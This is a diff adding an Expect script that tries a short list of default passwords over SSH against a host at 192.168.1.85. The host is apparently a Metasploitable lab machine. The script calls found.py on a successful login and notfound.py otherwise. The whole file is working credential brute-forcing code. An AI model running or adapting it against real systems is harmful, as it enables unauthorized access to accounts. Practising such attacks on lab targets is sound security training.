@@ -1,0 +1,42 @@
+#!/usr/bin/expect -f
+
+#exp_internal 1 #Used for expect debugging
+#TODO fix index
+set timeout 5
+#dummydata is required as every 3 iterations of our passwordlist a new ssh instance is created as we will be kicked out after 3 incorrect passwords.
+set passwords [list msfadmin msfadmin dummydata msfadmin x dummydata owaspbwa]
+set connected false
+set passwordUsed ""
+set idx 0
+
+spawn ssh -oHostKeyAlgorithms=+ssh-dss msfadmin@192.168.1.85 -y
+#Fingerprint confirmation
+expect {
+    "?" {
+        send -- "yes\r"
+    }
+}
+foreach i $passwords {
+    expect "assword:" {
+        if {$idx % 2 == 0} {
+            spawn ssh -oHostKeyAlgorithms=+ssh-dss msfadmin@192.168.1.85 -y
+            incr idx
+            exp_continue
+
+        } else {
+            incr idx
+            send_user $i
+            send -- "$i\r"
+        }
+    }
+    expect "msfadmin@metasploitable:" {
+        set connected true
+        send -- "exit\r"
+        spawn python ./found.py
+        expect eof 
+        exit
+    }  
+}
+spawn python ./notfound.py
+expect eof
+
